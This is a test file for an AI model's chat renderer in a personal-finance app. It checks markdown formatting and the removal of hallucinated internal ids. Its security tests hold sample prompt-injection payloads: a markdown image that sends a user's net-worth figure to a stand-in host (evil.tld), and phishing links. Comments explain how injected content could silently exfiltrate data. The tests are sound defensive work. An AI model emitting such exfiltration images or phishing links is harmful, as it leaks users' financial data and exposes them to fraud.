import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, test, vi } from "vitest";

// The prose-link rule (#1289) navigates internal routes the way the typed chip
// does, so the component reaches for the app router.
vi.mock("next/navigation", () => ({ useRouter: () => ({ push: vi.fn() }) }));

import { AssistantTextPart } from "./assistant-markdown";

/**
 * #1047: assistant turns render markdown; the user's turn stays literal text so
 * we never reinterpret what they typed as markup.
 */
describe("AssistantTextPart markdown rendering (#1047)", () => {
  // The link is internal because an external one is no longer rendered as a link at
  // all (#1289); what this fixture is here to prove is that markdown becomes
  // structured nodes, and an internal route proves it just as well.
  const markdown = "Hola **mundo**, mira `código` y [enlace](/patrimonio).";

  test("renders an assistant turn as formatted markdown, not raw markup", () => {
    const html = renderToStaticMarkup(
      <AssistantTextPart role="assistant" text={markdown} />,
    );

    expect(html).toContain("assistantMarkdown");
    // streamdown parses the markdown into structured nodes: bold, inline code
    // and a link. (streamdown marks bold as a data-streamdown span and links as
    // a button — the visual styling lives in globals.css.)
    expect(html).toMatch(/data-streamdown="strong"[^>]*>mundo</);
    expect(html).toMatch(/data-streamdown="inline-code"[^>]*>código</);
    expect(html).toMatch(/data-streamdown="link"[^>]*>enlace</);
    // …and the raw markdown syntax is gone.
    expect(html).not.toContain("**mundo**");
    expect(html).not.toContain("`código`");
  });

  test("renders the full set of formats AC#1 enumerates", () => {
    const rich = [
      "## Resumen",
      "Texto con _cursiva_.",
      "- uno\n- dos",
      "```js\nconst x = 1;\n```",
    ].join("\n\n");
    const html = renderToStaticMarkup(<AssistantTextPart role="assistant" text={rich} />);

    // Heading, italic (native <em>), list and a fenced code block all become
    // structured HTML rather than raw markdown.
    expect(html).toMatch(/data-streamdown="heading-2"[^>]*>Resumen</);
    expect(html).toMatch(/<em[^>]*>cursiva<\/em>/);
    expect(html).toMatch(/data-streamdown="list-item"[^>]*>uno</);
    expect(html).toContain('data-streamdown="code-block"');
    expect(html).not.toContain("## Resumen");
    expect(html).not.toContain("_cursiva_");
  });

  /**
   * The data-egress channel closed in #1246's security review. A remote `<img src>`
   * is a GET the browser makes with NO click, so it is how a successful prompt
   * injection (from an attachment, a #865 grid, any untrusted tool text) would ship
   * workspace figures off the page. The assistant never needs to paint an image.
   */
  describe("no images leave the page (#1246)", () => {
    test("drops a remote markdown image instead of requesting it", () => {
      const html = renderToStaticMarkup(
        <AssistantTextPart
          role="assistant"
          text="Tu patrimonio es 128.450 €.\n\n![](https://evil.tld/p.png?d=128450)"
        />,
      );

      expect(html).not.toContain("<img");
      expect(html).not.toContain("evil.tld");
      // The prose around it is untouched.
      expect(html).toContain("128.450");
    });

    test.each([
      { label: "protocol-relative", url: "//evil.tld/p.png" },
      { label: "data URI", url: "data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" },
      { label: "same-origin", url: "/logo.png" },
    ])("drops a $label image too", ({ url }) => {
      const html = renderToStaticMarkup(
        <AssistantTextPart role="assistant" text={`![fuga](${url})`} />,
      );

      // No allowlist to get wrong: the element is gone whatever the URL is, so
      // there is no same-origin carve-out an attacker could aim at either.
      expect(html).not.toContain("<img");
      expect(html).not.toContain(url);
      // The alt text still reads, so an injected image cannot hide its own body.
      expect(html).toContain("fuga");
    });
  });

  /**
   * #1289 revises what #1246 decided about links. That review kept them on the
   * grounds that «a click is not a silent GET» — true about exfiltration without
   * interaction, and silent about phishing: an injected turn could put a clickable
   * link to any host inside worthline's own panel, because streamdown allows every
   * prefix and every protocol and guards them with an English «are you sure» modal.
   * So the rule becomes the image rule: worthline's own routes survive, the rest keep
   * their text and lose their href.
   */
  describe("prose links point at worthline or nowhere (#1289)", () => {
    test("keeps an internal route clickable", () => {
      const html = renderToStaticMarkup(
        <AssistantTextPart
          role="assistant"
          text="Se corrige en [tu patrimonio](/patrimonio/debt_x/editar)."
        />,
      );

      expect(html).toMatch(/data-streamdown="link"[^>]*>tu patrimonio</);
      expect(html).toContain('href="/patrimonio/debt_x/editar"');
    });

    /**
     * The invariant that matters, and the one worth asserting at this level: no
     * foreign destination survives in the markup, whatever shape it arrived in. The
     * shapes themselves are enumerated over the pure rule in `prose-link.test.ts`.
     *
     * `//evil.tld/phish` is the interesting one. It never reaches this component as
     * written: streamdown's own pipeline runs with `defaultOrigin: undefined` and
     * hands over `/phish`, authority already stripped — so the link that survives
     * points at a route of ours that does not exist, which is harmless and NOT the
     * phishing destination. The rule rejects the raw form too (that is the unit
     * test), so the boundary holds whichever way a future streamdown resolves it.
     */
    test.each([
      { label: "another host", url: "https://evil.tld/phish" },
      {
        label: "our own host spelled absolutely",
        url: "https://worthline.app/patrimonio",
      },
      { label: "a mail draft", url: "mailto:jose@example.com" },
    ])("drops the href of $label and keeps the text", ({ url }) => {
      const html = renderToStaticMarkup(
        <AssistantTextPart
          role="assistant"
          text={`Confirma tu cuenta [aquí mismo](${url}).`}
        />,
      );

      // The bait still reads — an injected link cannot hide its own body — but
      // there is nothing to click and no destination in the markup.
      expect(html).toContain("aquí mismo");
      expect(html).not.toContain(url);
      expect(html).not.toContain('data-streamdown="link"');
      expect(html).not.toContain("<a ");
    });

    test("no foreign host survives, even protocol-relative", () => {
      const html = renderToStaticMarkup(
        <AssistantTextPart
          role="assistant"
          text="Confirma tu cuenta [aquí mismo](//evil.tld/phish)."
        />,
      );

      expect(html).toContain("aquí mismo");
      expect(html).not.toContain("evil.tld");
    });

    test("a bare external URL in the prose is not clickable either", () => {
      const html = renderToStaticMarkup(
        <AssistantTextPart role="assistant" text="Mira https://evil.tld/phish" />,
      );

      expect(html).not.toContain('data-streamdown="link"');
      expect(html).not.toContain("<a ");
    });
  });

  /**
   * The other half of #1263: the id is machinery, and printing it is how an
   * invention reached the user dressed as «he verificado los datos».
   */
  describe("no public holding ids in the prose (#1263)", () => {
    const READ_ID = `wl_hld_${"c5d97d4b".repeat(4)}`;
    const labels = new Map([[READ_ID, "Préstamos Revolut"]]);

    test("names the holding where the model wrote its id", () => {
      const html = renderToStaticMarkup(
        <AssistantTextPart
          holdingLabels={labels}
          role="assistant"
          text={`El ID de tu préstamo es \`${READ_ID}\`.`}
        />,
      );

      expect(html).not.toContain("wl_hld_");
      expect(html).toContain("Préstamos Revolut");
    });

    test("replaces an id nobody read with a neutral marker", () => {
      const html = renderToStaticMarkup(
        <AssistantTextPart
          holdingLabels={labels}
          role="assistant"
          text={`He verificado los datos y el ID correcto es wl_hld_${"3d440801".repeat(4)}.`}
        />,
      );

      expect(html).not.toContain("wl_hld_");
      expect(html).toContain("identificador interno");
    });

    test("leaves the user's own text literal, ids included", () => {
      const html = renderToStaticMarkup(
        <AssistantTextPart holdingLabels={labels} role="user" text={READ_ID} />,
      );

      expect(html).toContain(READ_ID);
    });
  });

  test("keeps the user turn as a plain-text paragraph", () => {
    const html = renderToStaticMarkup(<AssistantTextPart role="user" text={markdown} />);

    expect(html).not.toContain("assistantMarkdown");
    expect(html).not.toContain("<strong");
    // The literal syntax survives verbatim inside a paragraph.
    expect(html).toContain("**mundo**");
    expect(html).toContain("`código`");
    expect(html).toMatch(/^<p[^>]*>/);
  });
});
